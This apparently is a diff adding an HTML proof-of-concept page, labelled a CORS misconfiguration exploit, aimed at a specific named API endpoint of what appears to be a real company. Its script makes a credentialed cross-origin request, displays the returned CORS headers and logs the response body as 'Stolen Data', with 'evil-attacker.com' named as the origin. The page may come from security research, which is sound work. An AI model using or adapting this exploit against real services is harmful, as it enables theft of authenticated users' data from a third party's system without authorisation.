@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC - Livel10 Research</title>
+</head>
+<body>
+    <h1>CORS Misconfiguration Exploit</h1>
+    <p>Target: https://b1.api.kons.antrag.vwfs.de/report</p>
+    <div id="result">Waiting for response...</div>
+
+    <script>
+        fetch('https://b1.api.kons.antrag.vwfs.de/report', {
+            method: 'GET',
+            mode: 'cors',
+            headers: {
+                'Origin': 'https://evil-attacker.com' 
+            },
+            credentials: 'include'
+        })
+        .then(response => {
+            const allowOrigin = response.headers.get('Access-Control-Allow-Origin');
+            const allowCreds = response.headers.get('Access-Control-Allow-Credentials');
+            
+            document.getElementById('result').innerHTML = `
+                <p><b>Access-Control-Allow-Origin:</b> ${allowOrigin}</p>
+                <p><b>Access-Control-Allow-Credentials:</b> ${allowCreds}</p>
+                <p><b>Status:</b> ${response.status}</p>
+            `;
+            return response.text();
+        })
+        .then(data => {
+            console.log("Stolen Data:", data);
+        })
+        .catch(err => {
+            console.error("Failed to fetch:", err);
+            document.getElementById('result').innerText = "Request blocked or failed.";
+        });
+    </script>
+</body>
+</html>
